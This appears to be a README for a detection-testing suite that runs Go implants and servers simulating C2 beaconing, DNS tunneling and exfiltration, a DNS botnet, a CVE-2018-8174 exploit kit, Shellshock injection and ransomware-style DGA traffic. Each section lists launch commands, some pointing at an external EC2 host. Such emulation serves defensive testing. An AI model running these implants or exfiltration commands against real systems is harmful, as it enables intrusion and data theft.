# Command and Control Traffic Detection

## Test Cases Covered
* B1: HTTP Beaconing
* B2: HTTPS Beaconing

## Miscellaneous

### Prerequisites
1. Download and install Golang. This project was built using Go 1.14.4
2. Install the following Golang packages. For Windows users, installation of git command might be required.
```sh
go get github.com/miekg/dns
```

### Building implants and servers
Build implants when Go execution environment is not available at client side. The implants directory contains a shell script that builds implants automatically for multiple OS and architecture.
```sh
./build.sh
``` 

### Running implants and servers
If running build executable, replace ```go run <filename>``` with executable name. 

### Logging
When executing file via cmd prompt, redirect output to file so that log is saved to a file.
```sh
http.go.exe >> run.log
```

### Generating certificates
A sample server certificate is already included (server.crt and server.key). Use the following command to generate a new server side certificate for HTTPS communication
```sh
openssl genrsa -out server.key 2048
openssl ecparam -genkey -name secp384r1 -out server.key
openssl req -new -x509 -sha256 -key server.key -out server.crt -days 3650
```

## B1: HTTP Beaconing

### Client side
```sh
cd "C:\Users\ptuser\Documents\Project IronNet\B1 - HTTP Beaconing\implants"
go run http.go -url "http://127.0.0.1:80"
```

### Server side
```sh
cd "C:\Users\ptuser\Documents\Project IronNet\B1 - HTTP Beaconing\servers"
go run http.go
```

## B2: HTTPS Beaconing

### Client side
```sh
cd "C:\Users\ptuser\Documents\Project IronNet\B2 - HTTPS Beaconing\implants"
go run https.go -url "https://127.0.0.1:443"
```

### Server side
```sh
cd "C:\Users\ptuser\Documents\Project IronNet\B2 - HTTPS Beaconing\servers"
go run https.go
```

# Network Protocol Abuse

## Test Cases Covered
* C1: ALMA DNS Tunneling
* C2: ALMA DNS Tunneling - Shorter Labels
* C3: DNS Botnet
* C4: DNS Botnet - Shorter Labels

### Prerequisites
1. Download and install Golang. This project was built using Go 1.14.4
2. Install the following Golang packages. For Windows users, installation of git command might be required.
```sh
go get github.com/miekg/dns
go get syreclabs.com/go/faker
```

## C1: DNS Tunneling ALMA (Local DNS Resolver)

### Client side
```sh
cd "C:\Users\ptuser\Documents\Project IronNet\C1 - DNS Tunneling ALMA\implants"
go run dns.go -domain jtanadi.me
```

### Server side
1. Spin up EC2 instance
2. Copy script to EC2 instance
```sh
cd "C:\Users\ptuser\Downloads"
scp -i .\ensign-cte-test.pem '..\Documents\Project IronNet\C1 - DNS Tunneling ALMA\servers\dns.go' ubuntu@13.250.169.107:~/C1
```
3. Run DNS server on EC2 instance
```sh
cd "C:\Users\ptuser\Downloads"
ssh -i .\ensign-cte-test.pem ubuntu@13.250.169.107
```
```sh
cd C1
go run dns.go
```

## C1: DNS Tunneling ALMA (Explicit DNS)

### Client side
```sh
cd "C:\Users\ptuser\Documents\Project IronNet\C1 - DNS Tunneling ALMA\implants"
go run dns.go -ip 127.0.0.1
```

### Server side
```sh
cd "C:\Users\ptuser\Documents\Project IronNet\C1 - DNS Tunneling ALMA\servers"
go run dns.go
```

## C2: DNS Tunneling ALMA - Shorter Label (Local DNS Resolver)

### Client side
```sh
cd "C:\Users\ptuser\Documents\Project IronNet\C2 - DNS Tunneling ALMA - Shorter Label\implants"
go run dns.go -domain jtanadi.me
```

### Server side
1. Spin up EC2 instance
2. Copy script to EC2 instance
```sh
cd "C:\Users\ptuser\Downloads"
scp -i .\ensign-cte-test.pem '..\Documents\Project IronNet\C2 - DNS Tunneling ALMA - Shorter Label\servers\dns.go' ubuntu@13.250.169.107:~/C2
```
3. Run DNS server on EC2 instance
```sh
cd "C:\Users\ptuser\Downloads"
ssh -i .\ensign-cte-test.pem ubuntu@13.250.169.107
```
```sh
cd C2
go run dns.go
```

## C2: DNS Tunneling ALMA - Shorter Label (Explicit DNS)

### Client side
```sh
cd "C:\Users\ptuser\Documents\Project IronNet\C2 - DNS Tunneling ALMA - Shorter Label\implants"
go run dns.go -ip 127.0.0.1
```

### Server side
```sh
cd "C:\Users\ptuser\Documents\Project IronNet\C2 - DNS Tunneling ALMA - Shorter Label\servers"
go run dns.go
```

## C3: DNS Botnet (Local DNS Resolver)

### Client side
```sh
cd "C:\Users\ptuser\Documents\Project IronNet\C3 - DNS Botnet\implants"
go build
.\implants.exe -domain jtanadi.me
```

### Server side
```sh
cd "C:\Users\ptuser\Documents\Project IronNet\C3 - DNS Botnet\servers"
go build
.\dnsbotnet.exe -domain jtanadi.me -dns-addr "0.0.0.0:53"
```

## C3: DNS Botnet (Explicit DNS)

### Client side
```sh
cd "C:\Users\ptuser\Documents\Project IronNet\C3 - DNS Botnet\implants"
go build
.\implants.exe -domain jtanadi.me -dns-addr "127.0.0.1:53"
```

### Server side
```sh
cd "C:\Users\ptuser\Documents\Project IronNet\C3 - DNS Botnet\servers"
go build
.\dnsbotnet.exe -domain jtanadi.me -dns-addr "0.0.0.0:53"
```

## C4: DNS Botnet - Shorter Label (Local DNS Resolver)

### Client side
```sh
cd "C:\Users\ptuser\Documents\Project IronNet\C3 - DNS Botnet\implants"
go build
.\implants.exe -domain jtanadi.me -exfil-max 10
```

### Server side
```sh
cd "C:\Users\ptuser\Documents\Project IronNet\C3 - DNS Botnet\servers"
go build
.\dnsbotnet.exe -domain jtanadi.me -dns-addr "0.0.0.0:53"
```

## C3: DNS Botnet - Shorter Label (Explicit DNS)

### Client side
```sh
cd "C:\Users\ptuser\Documents\Project IronNet\C3 - DNS Botnet\implants"
go build
.\implants.exe -domain jtanadi.me -dns-addr "127.0.0.1:53" -exfil-max 10
```

### Server side
```sh
cd "C:\Users\ptuser\Documents\Project IronNet\C3 - DNS Botnet\servers"
go build
.\dnsbotnet.exe -domain jtanadi.me -dns-addr "0.0.0.0:53"
```

# Data Exfiltration/Leakage

## Test Cases Covered
* E1: DNS Exfiltration TXT Records

## E1 - DNS Exfiltration (Local DNS Resolver)

### Client side
```sh
cd "C:\Users\ptuser\Documents\Project IronNet\E1 - DNS Exfiltration\implants"
go run dns.go -domain jtanadi.me
```

### Server side
1. Spin up EC2 instance
2. Copy script to EC2 instance
```sh
cd "C:\Users\ptuser\Downloads"
scp -i .\ensign-cte-test.pem '..\Documents\Project IronNet\E1 - DNS Exfiltration\servers\dns.go' ubuntu@13.250.169.107:~/E1
```
3. Run DNS server on EC2 instance
```sh
cd "C:\Users\ptuser\Downloads"
ssh -i .\ensign-cte-test.pem ubuntu@13.250.169.107
```
```sh
cd E1
go run dns.go
```

## E1 - DNS Exfiltration (Explicit DNS)

### Client side
```sh
cd "C:\Users\ptuser\Documents\Project IronNet\E1 - DNS Exfiltration\implants"
go run dns.go -ip 127.0.0.1
```

### Server side
```sh
cd "C:\Users\ptuser\Documents\Project IronNet\E1 - DNS Exfiltration\servers"
go run dns.go
```

# Perimeter Breach

## Test Cases Covered
* F1: RCE Vulnerability Exploit / Exploit Kit (CVE-2018-8174)
* F2: Injection Attempt: Shellshock

## F1 - Exploit Kit

### Client side
1. Spin up Windows 7 Virtual Machine
2. Copy script to VM for execution
3. Run script at VM
```sh
go run http.go -url "http://192.168.1.143"
```

### Server side
```sh
cd "C:\Users\ptuser\Documents\Project IronNet\F1 - Exploit Kit\servers"
go run http.go -host "192.168.1.143"
```

## F2 - Shellshock

### Client side
```sh
cd "C:\Users\ptuser\Documents\Project IronNet\F2 - Shellshock\implants"
go run http.go -url "http://192.168.1.143"
```

### Server side
1. Spin up Linux Virtual Machine
2. Copy script to VM for execution
```sh
go run http.go
```

# Persistence

## Test Cases Covered
* G1: DGA - Zeus Ransomware
* G2: DGA - Locky Ransomware
* G3: DGA - Nymaim2 Malware

## G1 - Zeus Ransomware

### Client Side
```sh
cd "C:\Users\ptuser\Documents\Project IronNet\DGA\implants"
go run dns.go -option 1
```

## G1 - Zeus Ransomware (Explicit DNS - OPSEC)

### Client Side
```sh
cd "C:\Users\ptuser\Documents\Project IronNet\DGA\implants"
go run dns.go -option 1 -ip 127.0.0.1
```

### Server side
```sh
cd "C:\Users\ptuser\Documents\Project IronNet\DGA\servers"
go run dns.go
```

## G2 - Locky Ransomware

### Client Side
```sh
cd "C:\Users\ptuser\Documents\Project IronNet\DGA\implants"
go run dns.go -option 2
```

## G2 - Locky Ransomware (Explicit DNS - OPSEC)

### Client Side
```sh
cd "C:\Users\ptuser\Documents\Project IronNet\DGA\implants"
go run dns.go -option 2 -ip 127.0.0.1
```

### Server side
```sh
cd "C:\Users\ptuser\Documents\Project IronNet\DGA\servers"
go run dns.go
```

## G3 - Nymaim2 Malware

### Client Side
```sh
cd "C:\Users\ptuser\Documents\Project IronNet\DGA\implants"
go run dns.go -option 3
```

## G2 - Locky Ransomware (Explicit DNS - OPSEC)

### Client Side
```sh
cd "C:\Users\ptuser\Documents\Project IronNet\DGA\implants"
go run dns.go -option 3 -ip 127.0.0.1
```

### Server side
```sh
cd "C:\Users\ptuser\Documents\Project IronNet\DGA\servers"
go run dns.go
```


